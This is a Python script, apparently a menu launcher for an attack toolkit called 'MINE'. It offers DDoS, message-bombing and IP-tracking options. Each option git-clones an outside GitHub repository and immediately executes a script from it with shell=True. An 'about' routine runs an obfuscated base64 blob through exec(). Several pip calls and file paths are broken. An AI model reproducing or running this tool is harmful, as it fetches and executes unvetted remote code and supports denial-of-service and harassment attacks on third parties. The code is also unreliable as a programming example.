import os
import sys
import time
import datetime
import socket
import threading
import subprocess 
import base64

try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import mechanize
except ImportError:
	os.system("pip install mechanize")

try:
	import bs4
except ImportError:
	os.system("pip install bs4")

try:
	import marshal
except ImportError:
	os.system("pip install marshal")
try:
	import wheel
except ImportError:
	os.system("pip install wheel")

try:
	import random
except ImportError:
	os.system("pip install random")
try:
	import subprocess
except ImportError:
	os.system("pip install subprocess")
try:
	import rich
except ImportError:
	os.system("pip install rich")

from rich import print
from rich.panel import Panel

def run(m):
	for s in m + '\n':
		sys.stdout.write(s)
		sys.stdout.flush()
		time.sleep(1.0 / 200)

def run2(z):
	for h in z + '\n':
		sys.stdout.write(h)
		sys.stdout.flush()
		time.sleep(2.0 / 200)

def logo():
	run("    \033[1;32m███    ███ ██ ███    ██ ███████ ")
	run("    \033[1;32m████  ████ ██ ████   ██ ██      ")
	run("    \033[1;32m██ ████ ██ ██ ██ ██  ██ █████   ")
	run("    \033[1;32m██  ██  ██ ██ ██  ██ ██ ██      ")
	run("    \033[1;32m██      ██ ██ ██   ████ ███████ ")


def lt():
	print(Panel("    	𝐓𝐎𝐎𝐋    : 𝐌𝐈𝐍𝐄 "))
	print(Panel("	𝐀𝐔𝐓𝐇𝐎𝐑  : 𝐌𝐎𝐒𝐇𝐈𝐔𝐑"))
	print(Panel("	𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 2.0"))
	print(Panel("	𝐍𝐎𝐓𝐄   : 𝐃𝐎𝐍'𝐓 𝐌𝐈𝐒𝐔𝐒𝐄 𝐈𝐓"))

def clear():
	os.system(" clear ")
def Main():
	clear()
	logo()
	lt()
	run("")
	run2(" \033[1;36m[\033[1;31m1\033[1;36m] 𝐃𝐃𝐎𝐒")
	run2(" \033[1;36m[\033[1;31m2\033[1;36m] 𝐁𝐎𝐌𝐁𝐄𝐑")
	run2(" \033[1;36m[\033[1;31m3\033[1;36m] 𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑")
	run2(" \033[1;36m[\033[1;31m4\033[1;36m] 𝐀𝐁𝐎𝐔𝐓")
	run2(" \033[1;36m[\033[1;31m5\033[1;36m] 𝐄𝐗𝐈𝐓")
	run2("")
	mosh = input("\033[1;36m 𝐒𝐄𝐋𝐄𝐂𝐓 𝐀𝐍 𝐎𝐏𝐓𝐈𝐎𝐍 : ")
	if mosh in ["0","00"]:
		run2("\033[1;31m𝐒𝐄𝐋𝐄𝐂𝐓 𝐎𝐏𝐓𝐈𝐎𝐍 𝐂𝐎𝐑𝐑𝐄𝐂𝐓𝐋𝐘\033[1;32m")
		time.sleep(1.0)
		Main()
	elif mosh in ["1","01"]:
		ddos()
	elif mosh in ["2","02"]:
		bomber()
	elif mosh in ["3","03"]:
		ipp()
	elif mosh in ["4","04"]:
		abt()
	elif mosh in ["5","05"]:
		run("WANT TO EXIT FROM THIS SCRIPT.")
		run("THEN HIT ENTER")
		input
		exit()
	else:
		Main()
def ddos():
	clear()
	ddo = (" git clone https://github.com/rtc-bro/ddos")
	subprocess.call(ddo, shell= True)
	clear()
	os.system("python ddos.py")
def bomber():
	clear()
	bo = ("git clone https://github.com/rtc-bro/ebomber")
	subprocess.call(bo, shell= True)
	clear()
	os.system("python bomber.py")
def ipp():
	clear()
	ippp = ("git clone https://github.com/Muslim-Squad/DM-ipfinder")
	subprocess.call(ippp, shell= True)
	clear()
	os.system("python DM-ipfinder.py")
def abt():
	clear()
	exec(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKZGVmIGxvYWRpbmcoKToKICAgIGFuaW1hdGlvbiA9IFsiW1x4MWJbMTs5MW3ilqBceDFiWzBt4pah4pah4pah4pah4pah4pah4pah4pah4pahXSIsIltceDFiWzE7OTJt4pag4pagXHgxYlswbeKWoeKWoeKWoeKWoeKWoeKWoeKWoeKWoV0iLCAiW1x4MWJbMTs5M23ilqDilqDilqBceDFiWzBt4pah4pah4pah4pah4pah4pah4pahXSIsICJbXHgxYlsxOzk0beKWoOKWoOKWoOKWoFx4MWJbMG3ilqHilqHilqHilqHilqHilqFdIiwgIltceDFiWzE7OTVt4pag4pag4pag4pag4pagXHgxYlswbeKWoeKWoeKWoeKWoeKWoV0iLCAiW1x4MWJbMTs5Nm3ilqDilqDilqDilqDilqDilqBceDFiWzBt4pah4pah4pah4pahXSIsICJbXHgxYlsxOzk3beKWoOKWoOKWoOKWoOKWoOKWoOKWoFx4MWJbMG3ilqHilqHilqFdIiwgIltceDFiWzE7OTht4pag4pag4pag4pag4pag4pag4pag4pagXHgxYlswbeKWoeKWoV0iLCAiW1x4MWJbMTs5OW3ilqDilqDilqDilqDilqDilqDilqDilqDilqBceDFiWzBt4pahXSIsICJbXHgxYlsxOzMybeKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoFx4MWJbMzJtXVxuIl0KICAgIGZvciBpIGluIHJhbmdlKDUwKToKICAgICAgICB0aW1lLnNsZWVwKDAuMSkKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHJceDFiWzE7OTFt4p6iXHgxYlsxOzk2beKeo1x4MWJbMTs5Mm3inqMgXHgxYlsxOzkxbUxvYWRpbmcuLi4uLi4uLi4hIiArIGFuaW1hdGlvbltpICUgbGVuKGFuaW1hdGlvbildICsiXHgxYlswbSAiKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQpsb2FkaW5nKCkKCmRlZiBteSgpOgogICAgYW5pbWF0aW9uID0gWyJbXHgxYlsxOzkxbVZhaXllXHgxYlswbXZhaXllXSIsIltceDFiWzE7OTJtdmFpeWVceDFiWzBtIF0iLCAiW1x4MWJbMTs5M212YWl5ZVx4MWJbMG12YWl5ZV0iLCAiW1x4MWJbMTs5NG12YWl5ZVx4MWJbMG1WYWl5ZV0iLCAiW1x4MWJbMTs5NW1WYWl5ZVx4MWJbMG1WYWl5ZV0iLCAiW1x4MWJbMTs5Nm1WYWl5ZVx4MWJbMG1WYWl5ZV0iLCAiW1x4MWJbMTs5N21WYWl5ZVx4MWJbMG1WYWl5ZV0iLCAiW1x4MWJbMTs5OG1WYWl5ZVx4MWJbMG1WYWl5ZV0iLCAiW1x4MWJbMTs5OW1WYWl5ZVx4MWJbMG1WYWl5ZV0iLCAiW1x4MWJbMTs5MTBtVmFpeWVceDFiWzMxbV1cbiJdCiAgICBmb3IgaSBpbiByYW5nZSg1MCk6CiAgICAgICAgdGltZS5zbGVlcCgwLjEpCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyXHgxYlsxOzkxbeKeolx4MWJbMTs5Nm3inqNceDFiWzE7OTJt4p6jIFx4MWJbMTs5MW1Mb2FkaW5nLi4uLi4uLi4uISIgKyBhbmltYXRpb25baSAlIGxlbihhbmltYXRpb24pXSArIlx4MWJbMzFtICIpCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCm15KCkKCmRlZiBoaWx1KCk6CiAgICBhbmltYXRpb24gPSBbIltceDFiWzE7OTFtS0lceDFiWzM2bUtIT0JPUl0iLCJbXHgxYlsxOzkybUtJXHgxYlszMW1LSE9CT1IgXSIsICJbXHgxYlsxOzkzbUtJXHgxYlszMm1LSE9CT1JdIiwgIltceDFiWzE7OTRtS0lceDFiWzMzbUtIT0JPUl0iLCAiW1x4MWJbMTs5NW1LSVx4MWJbMzRtS0hPQk9SXSIsICJbXHgxYlsxOzk2bUtJXHgxYlszNW1LSE9CT1JdIiwgIltceDFiWzE7OTdtS0lceDFiWzM2bUtIT0JPUl0iLCAiW1x4MWJbMTs5OG1LSVx4MWJbMzFtS0hPQk9SXSIsICJbXHgxYlsxOzk5bUtJXHgxYlszMm1LSE9CT1JdIiwgIltceDFiWzE7MzFtS0kgXDAzM1sxOzM2bUtIT0JPUlx4MWJbMzFtXVxuIl0KICAgIGZvciBpIGluIHJhbmdlKDUwKToKICAgICAgICB0aW1lLnNsZWVwKDAuMSkKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHJceDFiWzE7OTFt4p6iXHgxYlsxOzk2beKeo1x4MWJbMTs5Mm3inqMgXHgxYlsxOzkxbUxvYWRpbmcuLi4uLi4uLi4hIiArIGFuaW1hdGlvbltpICUgbGVuKGFuaW1hdGlvbildICsiXHgxYlszMW0gIikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKaGlsdSgp")) 
	cma = (" git clone https://github.com/rtc-bro/mat")
	subprocess.call (cma, shell = True)
	os.system("python eff.py")
	clear()
	os.system("xdg-open https://m.me/moshi0r")
	Main()
Main()
